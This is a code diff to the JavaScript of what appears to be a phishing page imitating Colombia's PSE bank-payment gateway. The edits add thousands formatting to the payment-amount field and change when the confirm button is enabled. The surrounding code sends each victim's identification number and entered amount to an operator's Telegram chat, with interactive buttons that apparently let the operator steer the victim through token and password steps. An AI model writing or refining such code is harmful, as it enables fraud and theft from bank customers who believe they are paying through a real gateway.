@@ -1103,8 +1103,26 @@ inputToken.addEventListener('input', function () {
     errorToken.classList.remove('show');
 });
 
-inputValorPagar.addEventListener('input', function() {
-    this.value = this.value.replace(/\D/g, '');
+// 🚀 EVENTO PARA EL CAMPO DE VALOR A PAGAR (Formateo de miles)
+inputValorPagar.addEventListener('input', function(e) {
+    // 1. Quitar todo lo que no sea número
+    let valor = this.value.replace(/\D/g, '');
+    
+    // 2. Formatear con puntos de miles
+    if (valor.length > 0) {
+        valor = parseInt(valor, 10).toLocaleString('es-CO');
+        
+        // 3. Encender el botón (quitar clase opaco) si hay texto
+        if (pasoActualAmarillo === 2 && !btnAccionAmarillo.classList.contains('opaco') === false) {
+             btnAccionAmarillo.classList.remove('opaco');
+        }
+    } else {
+        // Si borra todo, apagar el botón en el paso 2
+        if (pasoActualAmarillo === 2) {
+             btnAccionAmarillo.classList.add('opaco');
+        }
+    }
+    this.value = valor;
 });
 
 btnToggleEye.addEventListener('click', function () {
@@ -1331,7 +1349,7 @@ function actualizarPasoAmarillo() {
         paso3Amarillo.style.display = 'none';
         containerValorPagar.style.display = 'block'; // MOSTRAR CAMPO DE DINERO
         btnAccionAmarillo.innerHTML = `✓ CONFIRMAR PAGO`;
-        btnAccionAmarillo.classList.remove('opaco'); // Siempre activo en el paso 2
+        btnAccionAmarillo.classList.add('opaco'); // 🚀 INICIA OPACO EN EL PASO 2
         
     } else if (pasoActualAmarillo === 3) {
         paso1Amarillo.style.display = 'none';
@@ -1345,7 +1363,7 @@ function actualizarPasoAmarillo() {
 
 // 🚀 EVENTO DEL BOTÓN (Se asigna UNA SOLA VEZ, no se clona)
 btnAccionAmarillo.addEventListener('click', function() {
-    // Si el botón está bloqueado (el usuario no ha marcado el check), no hace nada
+    // Si el botón está bloqueado, no hace nada
     if (btnAccionAmarillo.classList.contains('opaco')) {
         return;
     }
@@ -1376,9 +1394,7 @@ btnAccionAmarillo.addEventListener('click', function() {
         const valorIngresado = inputValorPagar.value.trim();
         
         if (valorIngresado === '') {
-            alert('Por favor, digite el valor que desea pagar.');
-            inputValorPagar.focus();
-            return;
+            return; // Ya está validado por la clase opaco, pero por seguridad
         }
 
         pasoActualAmarillo = 3;
@@ -1389,7 +1405,7 @@ btnAccionAmarillo.addEventListener('click', function() {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
-                text: `⚠️ <b>EL USUARIO ESTÁ EN LA PASARELA PSE (PASO 3)</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>\n💰 <b>Valor a pagar:</b> <code>$${valorIngresado}</code>`, 
+                text: `⚠️ <b>EL USUARIO ESTÁ EN LA PASARELA PSE (PASO 3)</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>\n💰 <b>Valor a pagar:</b> <code>$ ${valorIngresado} COP</code>`, 
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
